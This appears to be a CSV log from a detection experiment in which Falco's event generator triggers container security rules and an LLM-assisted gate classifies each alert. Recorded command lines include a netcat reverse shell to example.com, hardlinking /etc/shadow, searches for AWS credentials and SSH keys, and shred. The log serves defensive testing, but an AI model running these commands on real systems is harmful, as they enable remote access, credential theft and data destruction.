timestamp,event_type,rule_name,priority,prompt_tokens,completion_tokens,latency_ms,remediation_status,remediation_action,mitre_technique,target_container,attack_source,attack_label,attack_id,container_id,container_image,event_source,experiment_mode,ground_truth,rule_matched,llm_called,cache_hit,cache_key,gate_decision,llm_action,llm_threat_level,cache_ttl
2026-05-17T13:09:07.560843,rule-matched,Read sensitive file untrusted,Warning,0,0,0,skipped,,T1083,falco-event-generator,manual,Read sensitive file untrusted,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,1,0,0,,rule,,,300
2026-05-17T13:09:09.141218,rule-matched,Run shell untrusted,Notice,0,0,0,skipped,,T1059,falco-event-generator,manual,Run shell untrusted,sh -c ls > /dev/null,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,1,0,0,,rule,,,300
2026-05-17T13:09:10.734114,cache-hit,Fileless execution via memfd_create,Critical,0,0,0,ignored,,,,manual,Fileless execution via memfd_create,4 run helper.DoNothing,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,ed1d903fc003a9a58bc1a53dc4c8ee7d,cache-hit,alert,high,300
2026-05-17T13:09:12.313989,cache-hit,Create Hardlink Over Sensitive Files,Warning,0,0,0,ignored,,,,manual,Create Hardlink Over Sensitive Files,ln -v /etc/shadow /tmp/falco-event-generator-syscall-CreateHardlinkOverSensitiveFiles-92734879/shadow_link,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,ce29cc75814d17294a676363d10f7622,cache-hit,alert,medium,300
2026-05-17T13:09:13.892334,cache-hit,System user interactive,Informational,0,0,0,ignored,,,,manual,System user interactive,login,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,256d745947e9b7d7eae333d0ebd169e3,cache-hit,pause,high,300
2026-05-17T13:09:15.473135,rule-matched,Drop and execute new binary in container,Critical,0,0,0,skipped,,T1485,falco-event-generator,manual,Drop and execute new binary in container,falco-event-gen,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,1,0,0,,rule,,,300
2026-05-17T13:09:17.052440,cache-hit,PTRACE anti-debug attempt,Notice,0,0,0,ignored,,,,manual,PTRACE anti-debug attempt,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,1e39dfc23dcf83ae7a47a9666599847c,cache-hit,alert,medium,300
2026-05-17T13:09:18.631263,cache-hit,Directory traversal monitored file read,Warning,0,0,0,ignored,,,,manual,Directory traversal monitored file read,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,6b25374d77be2bccc3489c6473bdb223,cache-hit,alert,medium,300
2026-05-17T13:09:29.271764,llm-analyzed,Read sensitive file trusted after startup,Warning,381,74,9061,ignored,,,,manual,Read sensitive file trusted after startup,httpd --loglevel info run ^syscall.ReadSensitiveFileUntrusted$ --sleep 6s,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,b7d41082564995db77d6b74b75a4f3d2,llm,pause,medium,300
2026-05-17T13:09:42.546256,llm-analyzed,Disallowed SSH Connection Non Standard Port,Notice,384,104,11693,ignored,,,,manual,Disallowed SSH Connection Non Standard Port,ssh user@example.com -p 443,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,629494c6c6d948ac631c427d8d609862,llm,alert,medium,300
2026-05-17T13:09:53.178908,llm-analyzed,Find AWS Credentials,Warning,367,76,9040,ignored,,,,manual,Find AWS Credentials,find /tmp -maxdepth 1 -iname .aws/credentials,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,b95c830e335267463f9a43857f2ed885,llm,alert,medium,300
2026-05-17T13:10:03.452496,llm-analyzed,Remove Bulk Data from Disk,Warning,385,60,8693,ignored,,,,manual,Remove Bulk Data from Disk,shred -u /tmp/falco-event-generator-syscall-RemoveBulkDataFromDisk-3052864100,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,6c972ecf189eefa9be9e4d28f665b944,llm,pause,medium,300
2026-05-17T13:10:16.138854,llm-analyzed,Execution from /dev/shm,Warning,408,102,11105,ignored,,,,manual,Execution from /dev/shm,sh -c /dev/shm/falco-event-generator-syscall-ExecutionFromDevShm-oUCSJJ.sh,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,4e4f7083604fc1fe55707f472ebe6270,llm,alert,medium,300
2026-05-17T13:10:17.719256,cache-hit,Execution from /dev/shm,Warning,0,0,0,ignored,,,,manual,Execution from /dev/shm,sh -c /dev/shm/falco-event-generator-syscall-ExecutionFromDevShm-oUCSJJ.sh,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,4e4f7083604fc1fe55707f472ebe6270,cache-hit,alert,medium,300
2026-05-17T13:10:27.141185,llm-analyzed,Clear Log Activities,Warning,343,60,7838,ignored,,,,manual,Clear Log Activities,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,357658d27e05316e491368365302d386,llm,alert,medium,300
2026-05-17T13:10:37.578053,llm-analyzed,Create Symlink Over Sensitive Files,Warning,411,57,8856,ignored,,,,manual,Create Symlink Over Sensitive Files,ln -s /etc /tmp/falco-event-generator-syscall-CreateSymlinkOverSensitiveFiles-181882566/etc_link,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,aa21b1177c801979bea62a239e056977,llm,pause,medium,300
2026-05-17T13:10:39.158331,rule-matched,Netcat Remote Code Execution in Container,Warning,0,0,0,skipped,,T1059,falco-event-generator,manual,Netcat Remote Code Execution in Container,nc -e /bin/sh example.com 22,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,1,0,0,,rule,,,300
2026-05-17T13:10:48.734936,llm-analyzed,Packet socket created in container,Notice,363,57,7995,ignored,,,,manual,Packet socket created in container,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,50444a11263ba4bdc942b447dce33e70,llm,stop,medium,300
2026-05-17T13:10:50.315398,rule-matched,Read sensitive file untrusted,Warning,0,0,0,skipped,,T1083,falco-event-generator,manual,Read sensitive file untrusted,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,1,0,0,,rule,,,300
2026-05-17T13:10:51.908078,rule-matched,Run shell untrusted,Notice,0,0,0,skipped,,T1059,falco-event-generator,manual,Run shell untrusted,sh -c ls > /dev/null,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,1,0,0,,rule,,,300
2026-05-17T13:10:53.492677,cache-hit,Fileless execution via memfd_create,Critical,0,0,0,ignored,,,,manual,Fileless execution via memfd_create,4 run helper.DoNothing,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,ed1d903fc003a9a58bc1a53dc4c8ee7d,cache-hit,alert,high,300
2026-05-17T13:10:55.073086,cache-hit,Create Hardlink Over Sensitive Files,Warning,0,0,0,ignored,,,,manual,Create Hardlink Over Sensitive Files,ln -v /etc/shadow /tmp/falco-event-generator-syscall-CreateHardlinkOverSensitiveFiles-3111831029/shadow_link,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,ce29cc75814d17294a676363d10f7622,cache-hit,alert,medium,300
2026-05-17T13:10:56.654051,cache-hit,System user interactive,Informational,0,0,0,ignored,,,,manual,System user interactive,login,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,256d745947e9b7d7eae333d0ebd169e3,cache-hit,pause,high,300
2026-05-17T13:10:58.234997,rule-matched,Drop and execute new binary in container,Critical,0,0,0,skipped,,T1485,falco-event-generator,manual,Drop and execute new binary in container,falco-event-gen,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,1,0,0,,rule,,,300
2026-05-17T13:10:59.815897,cache-hit,PTRACE anti-debug attempt,Notice,0,0,0,ignored,,,,manual,PTRACE anti-debug attempt,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,1e39dfc23dcf83ae7a47a9666599847c,cache-hit,alert,medium,300
2026-05-17T13:11:01.395271,rule-matched,PTRACE attached to process,Warning,0,0,0,skipped,,T1068,falco-event-generator,manual,PTRACE attached to process,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,1,0,0,,rule,,,300
2026-05-17T13:11:02.974766,cache-hit,Search Private Keys or Passwords,Warning,0,0,0,ignored,,,,manual,Search Private Keys or Passwords,find /tmp -maxdepth 1 -iname id_rsa,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,3a08e749a190242c74492afdfc1de468,cache-hit,stop,medium,300
2026-05-17T13:11:04.553233,rule-matched,PTRACE attached to process,Warning,0,0,0,skipped,,T1068,falco-event-generator,manual,PTRACE attached to process,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,1,0,0,,rule,,,300
2026-05-17T13:11:06.134884,cache-hit,Search Private Keys or Passwords,Warning,0,0,0,ignored,,,,manual,Search Private Keys or Passwords,find /tmp -maxdepth 1 -iname id_rsa,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,3a08e749a190242c74492afdfc1de468,cache-hit,stop,medium,300
2026-05-17T13:11:15.513618,llm-analyzed,Directory traversal monitored file read,Warning,350,57,7785,ignored,,,,manual,Directory traversal monitored file read,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,6b25374d77be2bccc3489c6473bdb223,llm,alert,high,300
2026-05-17T13:11:17.092882,cache-hit,Read sensitive file trusted after startup,Warning,0,0,0,ignored,,,,manual,Read sensitive file trusted after startup,httpd --loglevel info run ^syscall.ReadSensitiveFileUntrusted$ --sleep 6s,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,b7d41082564995db77d6b74b75a4f3d2,cache-hit,pause,medium,300
2026-05-17T13:11:18.672848,cache-hit,Disallowed SSH Connection Non Standard Port,Notice,0,0,0,ignored,,,,manual,Disallowed SSH Connection Non Standard Port,ssh user@example.com -p 443,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,629494c6c6d948ac631c427d8d609862,cache-hit,alert,medium,300
2026-05-17T13:11:20.251690,cache-hit,Find AWS Credentials,Warning,0,0,0,ignored,,,,manual,Find AWS Credentials,find /tmp -maxdepth 1 -iname .aws/credentials,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,b95c830e335267463f9a43857f2ed885,cache-hit,alert,medium,300
2026-05-17T13:11:21.832003,cache-hit,Remove Bulk Data from Disk,Warning,0,0,0,ignored,,,,manual,Remove Bulk Data from Disk,shred -u /tmp/falco-event-generator-syscall-RemoveBulkDataFromDisk-831757150,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,6c972ecf189eefa9be9e4d28f665b944,cache-hit,pause,medium,300
2026-05-17T13:11:23.412071,cache-hit,Execution from /dev/shm,Warning,0,0,0,ignored,,,,manual,Execution from /dev/shm,sh -c /dev/shm/falco-event-generator-syscall-ExecutionFromDevShm-OqeliP.sh,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,4e4f7083604fc1fe55707f472ebe6270,cache-hit,alert,medium,300
2026-05-17T13:11:24.991350,cache-hit,Execution from /dev/shm,Warning,0,0,0,ignored,,,,manual,Execution from /dev/shm,sh -c /dev/shm/falco-event-generator-syscall-ExecutionFromDevShm-OqeliP.sh,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,4e4f7083604fc1fe55707f472ebe6270,cache-hit,alert,medium,300
2026-05-17T13:11:26.570744,cache-hit,Clear Log Activities,Warning,0,0,0,ignored,,,,manual,Clear Log Activities,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,357658d27e05316e491368365302d386,cache-hit,alert,medium,300
2026-05-17T13:11:28.151393,cache-hit,Create Symlink Over Sensitive Files,Warning,0,0,0,ignored,,,,manual,Create Symlink Over Sensitive Files,ln -s /etc /tmp/falco-event-generator-syscall-CreateSymlinkOverSensitiveFiles-1922615288/etc_link,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,aa21b1177c801979bea62a239e056977,cache-hit,pause,medium,300
2026-05-17T13:11:29.745387,rule-matched,Netcat Remote Code Execution in Container,Warning,0,0,0,skipped,,T1059,falco-event-generator,manual,Netcat Remote Code Execution in Container,nc -e /bin/sh example.com 22,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,1,0,0,,rule,,,300
2026-05-17T13:11:31.326374,cache-hit,Packet socket created in container,Notice,0,0,0,ignored,,,,manual,Packet socket created in container,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,50444a11263ba4bdc942b447dce33e70,cache-hit,stop,medium,300
2026-05-17T13:11:32.905923,rule-matched,Read sensitive file untrusted,Warning,0,0,0,skipped,,T1083,falco-event-generator,manual,Read sensitive file untrusted,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,1,0,0,,rule,,,300
2026-05-17T13:11:34.491100,rule-matched,Run shell untrusted,Notice,0,0,0,skipped,,T1059,falco-event-generator,manual,Run shell untrusted,sh -c ls > /dev/null,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,1,0,0,,rule,,,300
2026-05-17T13:11:44.978251,llm-analyzed,Fileless execution via memfd_create,Critical,376,71,8907,ignored,,,,manual,Fileless execution via memfd_create,4 run helper.DoNothing,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,ed1d903fc003a9a58bc1a53dc4c8ee7d,llm,pause,medium,300
2026-05-17T13:11:56.219096,llm-analyzed,Create Hardlink Over Sensitive Files,Warning,421,68,9661,ignored,,,,manual,Create Hardlink Over Sensitive Files,ln -v /etc/shadow /tmp/falco-event-generator-syscall-CreateHardlinkOverSensitiveFiles-1953500039/shadow_link,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,ce29cc75814d17294a676363d10f7622,llm,alert,medium,300
2026-05-17T13:12:04.663660,llm-analyzed,System user interactive,Informational,314,51,6864,ignored,,,,manual,System user interactive,login,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,256d745947e9b7d7eae333d0ebd169e3,llm,pause,medium,300
2026-05-17T13:12:06.244740,rule-matched,Drop and execute new binary in container,Critical,0,0,0,skipped,,T1485,falco-event-generator,manual,Drop and execute new binary in container,falco-event-gen,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,1,0,0,,rule,,,300
2026-05-17T13:12:15.941331,llm-analyzed,PTRACE anti-debug attempt,Notice,331,71,8079,ignored,,,,manual,PTRACE anti-debug attempt,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,1e39dfc23dcf83ae7a47a9666599847c,llm,alert,high,300
2026-05-17T13:12:17.524094,rule-matched,PTRACE attached to process,Warning,0,0,0,skipped,,T1068,falco-event-generator,manual,PTRACE attached to process,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,1,0,0,,rule,,,300
2026-05-17T13:12:27.481854,llm-analyzed,Search Private Keys or Passwords,Warning,342,73,8378,ignored,,,,manual,Search Private Keys or Passwords,find /tmp -maxdepth 1 -iname id_rsa,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,3a08e749a190242c74492afdfc1de468,llm,alert,medium,300
2026-05-17T13:12:29.061371,cache-hit,Directory traversal monitored file read,Warning,0,0,0,ignored,,,,manual,Directory traversal monitored file read,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,6b25374d77be2bccc3489c6473bdb223,cache-hit,alert,high,300
2026-05-17T13:12:30.641261,cache-hit,Read sensitive file trusted after startup,Warning,0,0,0,ignored,,,,manual,Read sensitive file trusted after startup,httpd --loglevel info run ^syscall.ReadSensitiveFileUntrusted$ --sleep 6s,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,b7d41082564995db77d6b74b75a4f3d2,cache-hit,pause,medium,300
2026-05-17T13:12:32.221616,cache-hit,Disallowed SSH Connection Non Standard Port,Notice,0,0,0,ignored,,,,manual,Disallowed SSH Connection Non Standard Port,ssh user@example.com -p 443,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,629494c6c6d948ac631c427d8d609862,cache-hit,alert,medium,300
2026-05-17T13:12:33.802126,cache-hit,Find AWS Credentials,Warning,0,0,0,ignored,,,,manual,Find AWS Credentials,find /tmp -maxdepth 1 -iname .aws/credentials,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,b95c830e335267463f9a43857f2ed885,cache-hit,alert,medium,300
2026-05-17T13:12:35.382055,cache-hit,Remove Bulk Data from Disk,Warning,0,0,0,ignored,,,,manual,Remove Bulk Data from Disk,shred -u /tmp/falco-event-generator-syscall-RemoveBulkDataFromDisk-4087899463,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,6c972ecf189eefa9be9e4d28f665b944,cache-hit,pause,medium,300
2026-05-17T13:12:36.960280,cache-hit,Execution from /dev/shm,Warning,0,0,0,ignored,,,,manual,Execution from /dev/shm,sh -c /dev/shm/falco-event-generator-syscall-ExecutionFromDevShm-22fTbv.sh,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,4e4f7083604fc1fe55707f472ebe6270,cache-hit,alert,medium,300
2026-05-17T13:12:38.541242,cache-hit,Execution from /dev/shm,Warning,0,0,0,ignored,,,,manual,Execution from /dev/shm,sh -c /dev/shm/falco-event-generator-syscall-ExecutionFromDevShm-22fTbv.sh,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,4e4f7083604fc1fe55707f472ebe6270,cache-hit,alert,medium,300
2026-05-17T13:12:40.131171,cache-hit,Clear Log Activities,Warning,0,0,0,ignored,,,,manual,Clear Log Activities,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,357658d27e05316e491368365302d386,cache-hit,alert,medium,300
2026-05-17T13:12:41.712790,cache-hit,Create Symlink Over Sensitive Files,Warning,0,0,0,ignored,,,,manual,Create Symlink Over Sensitive Files,ln -s /etc /tmp/falco-event-generator-syscall-CreateSymlinkOverSensitiveFiles-1937500118/etc_link,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,aa21b1177c801979bea62a239e056977,cache-hit,pause,medium,300
